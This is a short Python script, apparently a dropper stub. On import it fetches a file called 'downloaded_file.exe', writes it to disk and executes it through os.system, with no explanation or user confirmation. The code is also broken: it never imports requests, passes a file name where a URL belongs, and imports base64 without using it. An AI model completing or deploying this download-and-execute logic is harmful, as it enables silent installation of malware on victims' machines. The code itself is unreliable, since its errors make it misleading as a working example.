import os
import time
import base64

def download_file(url):
    try:
        response = requests.get(url)
        file_content = response.content
        return file_content
    except requests.exceptions.RequestException:
        print("Error: Failed to connect to the server.")
        return None

def save_file(file_content, destination):
    try:
        with open(destination, 'wb') as file:
            file.write(file_content)
        print(f"File saved at {destination}")
    except IOError:
        print("Error: Failed to save the file.")

def execute_downloaded_file():
    try:
        time.sleep(5)  # Simulate download delay
        file_path = "downloaded_file.exe"
        file_content = download_file(file_path)
        if file_content is not None:
            save_file(file_content, file_path)

        # Execute the downloaded file
        os.system(f" {file_path}")

    except Exception as e:
        print(f"Error: {str(e)}")

# Main execution
execute_downloaded_file()
